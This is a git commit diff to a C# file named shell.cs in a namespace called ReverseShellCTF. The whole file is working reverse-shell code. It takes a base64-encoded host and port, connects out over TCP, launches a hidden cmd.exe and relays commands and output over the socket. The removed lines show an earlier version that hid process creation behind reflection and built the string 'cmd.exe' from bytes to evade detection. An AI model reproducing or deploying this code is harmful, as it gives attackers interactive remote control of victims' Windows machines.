8a43eee2da93ecac8fb3756475de36e64d92a823
Gautham Prasath <gauthamprasath888@gmail.com>
2025-09-25 10:13:11 +0530

    Update shell.cs

--- shell.cs
+++ shell.cs
@@ -2,16 +2,13 @@ using System;
 using System.Net.Sockets;
 using System.Text;
 using System.IO;
-using System.Threading;
 using System.Diagnostics;
-using System.Reflection;
 
 namespace ReverseShellCTF
 {
     class Program
     {
-        private static StringBuilder buffer = new StringBuilder();
-        private static StreamWriter writer;
+        static StreamWriter writer;
 
         static void Main(string[] args)
         {
@@ -19,7 +16,6 @@ namespace ReverseShellCTF
             {
                 if (args.Length != 2)
                 {
-                    Console.WriteLine("Usage: NativePayload.exe <base64_ip> <base64_port>");
                     return;
                 }
 
@@ -30,62 +26,49 @@ namespace ReverseShellCTF
                 using (NetworkStream stream = client.GetStream())
                 using (StreamReader reader = new StreamReader(stream))
                 {
-                    writer = new StreamWriter(stream);
-                    object process = Activator.CreateInstance(Type.GetType("System.Diagnostics.Process"));
-                    object startInfo = process.GetType().GetProperty("StartInfo").GetValue(process);
+                    writer = new StreamWriter(stream) { AutoFlush = true };
 
-                    string shell = GetShellName();
+                    Process process = new Process();
+                    process.StartInfo.FileName = "cmd.exe";
+                    process.StartInfo.CreateNoWindow = true;
+                    process.StartInfo.UseShellExecute = false;
+                    process.StartInfo.RedirectStandardInput = true;
+                    process.StartInfo.RedirectStandardOutput = true;
+                    process.StartInfo.RedirectStandardError = true;
 
-                    SetProperty(startInfo, "FileName", shell);
-                    SetProperty(startInfo, "CreateNoWindow", true);
-                    SetProperty(startInfo, "UseShellExecute", false);
-                    SetProperty(startInfo, "RedirectStandardOutput", true);
-                    SetProperty(startInfo, "RedirectStandardInput", true);
-                    SetProperty(startInfo, "RedirectStandardError", true);
+                    process.OutputDataReceived += (sender, e) => {
+                        if (!string.IsNullOrEmpty(e.Data))
+                        {
+                            try { writer.WriteLine(e.Data); } catch { }
+                        }
+                    };
 
-                    EventHandler<DataReceivedEventArgs> handler = new EventHandler<DataReceivedEventArgs>(DataReceived);
+                    process.ErrorDataReceived += (sender, e) => {
+                        if (!string.IsNullOrEmpty(e.Data))
+                        {
+                            try { writer.WriteLine(e.Data); } catch { }
+                        }
+                    };
 
-                    process.GetType().GetEvents()[0].AddEventHandler(process, handler);
-
-                    process.GetType().GetMethod("Start").Invoke(process, null);
-                    process.GetType().GetMethod("BeginOutputReadLine").Invoke(process, null);
+                    process.Start();
+                    process.BeginOutputReadLine();
+                    process.BeginErrorReadLine();
 
                     while (true)
                     {
                         string cmd = reader.ReadLine();
-                        if (cmd != null)
-                        {
-                            process.GetType().GetProperty("StandardInput").GetValue(process).GetType().GetMethod("WriteLine").Invoke(
-                                process.GetType().GetProperty("StandardInput").GetValue(process), new object[] { cmd });
-                        }
+                        if (cmd == null) break;
+
+                        process.StandardInput.WriteLine(cmd);
+                        process.StandardInput.Flush();
                     }
+
+                    process.WaitForExit();
                 }
             }
-            catch { }
-        }
-
-        private static void SetProperty(object obj, string propName, object value)
-        {
-            obj.GetType().GetProperty(propName).SetValue(obj, value);
-        }
-
-        private static string GetShellName()
-        {
-            // Returns "cmd.exe" from obfuscated characters
-            byte[] parts = new byte[] { 99, 109, 100, 46, 101, 120, 101 }; // cmd.exe
-            return Encoding.ASCII.GetString(parts);
-        }
-
-        private static void DataReceived(object sender, DataReceivedEventArgs e)
-        {
-            if (!string.IsNullOrEmpty(e.Data))
+            catch (Exception ex)
             {
-                try
-                {
-                    writer.WriteLine(e.Data);
-                    writer.Flush();
-                }
-                catch { }
+                File.WriteAllText("C:\\Windows\\Temp\\rev_error.txt", ex.ToString());
             }
         }
     }
